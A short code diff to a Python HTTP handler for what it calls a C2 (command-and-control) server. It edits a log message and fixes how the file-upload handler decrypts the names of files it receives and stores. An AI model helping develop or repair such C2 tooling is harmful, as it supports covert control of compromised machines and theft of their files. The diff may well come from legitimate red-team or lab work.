@@ -110,7 +110,7 @@ class C2Handler(BaseHTTPRequestHandler):
             global cwd
             cwd = self.handle_post_data()
         else:
-            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server. Why ?\n")
+            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST. Why ?\n")
     
     def do_PUT(self):
         if self.path.startswith(FILE_SEND + "/"):
@@ -118,7 +118,7 @@ class C2Handler(BaseHTTPRequestHandler):
             filename = self.path.split(FILE_SEND + "/")[1]
 
             print(f"filename before decryption {filename}")
-            filename = cipher.decrypt(filename.encode()).encode()
+            filename = cipher.decrypt(filename.encode()).decode()
             incoming_file = STORAGE + "/" + filename
             print(incoming_file)
             file_length = int(self.headers["Content-Length"])
